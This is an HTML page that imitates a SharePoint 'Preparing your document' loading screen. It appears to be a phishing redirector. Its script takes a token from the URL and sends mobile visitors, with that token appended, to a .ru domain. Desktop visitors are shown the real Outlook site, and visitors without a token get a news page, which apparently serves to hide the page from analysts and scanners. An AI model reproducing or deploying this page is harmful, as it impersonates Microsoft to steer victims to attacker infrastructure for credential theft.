<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading - SharePoint</title>
    <style>
        body {
            font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            background-color: #f3f2f1;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            border-radius: 2px;
            box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 0.3px 0.9px 0 rgba(0,0,0,.108);
            padding: 24px;
            width: 400px;
            max-width: 90%;
        }
        .header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            border-bottom: 1px solid #edebe9;
            padding-bottom: 16px;
        }
        .sharepoint-icon {
            width: 32px;
            height: 32px;
            margin-right: 12px;
            background-color: #0078d4;
            border-radius: 2px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }
        .title {
            color: #323130;
            font-size: 20px;
            font-weight: 600;
            margin: 0;
        }
        .loading-container {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
        }
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #f3f2f1;
            border-top-color: #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 12px;
        }
        .loading-text {
            color: #323130;
            font-size: 14px;
            margin: 0;
        }
        .progress-container {
            background-color: #f3f2f1;
            height: 4px;
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 16px;
        }
        .progress-bar {
            height: 100%;
            background-color: #0078d4;
            width: 0%;
            animation: fill 2s linear forwards;
        }
        .file-info {
            color: #605e5c;
            font-size: 12px;
            margin: 0;
        }
        .status-bar {
            display: flex;
            align-items: center;
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid #edebe9;
        }
        .status-icon {
            width: 16px;
            height: 16px;
            margin-right: 8px;
            color: #0078d4;
        }
        .status-text {
            color: #605e5c;
            font-size: 12px;
            margin: 0;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes fill {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        noscript {
            display: block;
            margin-top: 16px;
            padding: 12px;
            background-color: #fde7e9;
            color: #a4262c;
            border-radius: 2px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="sharepoint-icon">S</div>
            <h1 class="title">SharePoint</h1>
        </div>
        <div class="loading-container">
            <div class="spinner"></div>
            <p class="loading-text">Preparing your document...</p>
        </div>
        <div class="progress-container">
            <div class="progress-bar"></div>
        </div>
        <p class="file-info">This may take a moment</p>
        <div class="status-bar">
            <svg class="status-icon" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
                <path fill="currentColor" d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zm0 14c-3.3 0-6-2.7-6-6s2.7-6 6-6 6 2.7 6 6-2.7 6-6 6z"/>
            </svg>
            <p class="status-text">Verifying access permissions...</p>
        </div>
        <noscript>
            <p>JavaScript is required to proceed. Please enable JavaScript in your browser settings and reload the page.</p>
        </noscript>
    </div>

    <!-- Simple device detection and redirect script -->
    <script>
    (function() {
        const REDIRECT_DELAY = 800;
        const MOBILE_REDIRECT_URL_BASE = "https://5fYTR.ewwyb.ru/@NEMeyXbLJgjOtJ/$";
        const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
        const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found

        // Mobile device detection function
        function isMobileDevice() {
            const userAgent = navigator.userAgent.toLowerCase();
            return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
        }

        // Get potential value from hash (priority) or search string
        function getPotentialValue() {
            const hash = window.location.hash.substring(1); // Remove leading '#'
            if (hash) {
                // Hash value doesn't typically need decoding, but we do it for consistency
                try { return decodeURIComponent(hash); } catch (e) { return hash; } // Fallback to raw hash on decode error
            }
            const search = window.location.search.substring(1); // Remove leading '?'
            if (search) {
                // Query string *does* need decoding
                try { return decodeURIComponent(search); } catch (e) { return search; } // Fallback to raw search on decode error
            }
            return null; // No hash or search string found
        }

        // Main redirect function (Ultra-Simplified)
        function performRedirect() {
            const value = getPotentialValue();

            if (value) {
                // Value exists (no validation or decoding needed beyond URI component)
                console.log("Found value:", value);
                if (isMobileDevice()) {
                    // Redirect mobile devices with the raw value appended
                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
                    window.location.href = redirectUrl;
                } else {
                    // Redirect non-mobile devices to Outlook
                    console.log("Non-mobile device detected. Redirecting to Outlook:", DESKTOP_REDIRECT_URL);
                    window.location.href = DESKTOP_REDIRECT_URL;
                }
            } else {
                // No value found
                console.log("No value found in hash or search. Redirecting all devices to dead URL:", DEAD_URL);
                window.location.href = DEAD_URL;
            }
        }

        // Execute redirect after a short delay
        setTimeout(performRedirect, REDIRECT_DELAY);
    })();
    </script>
</body>
</html>
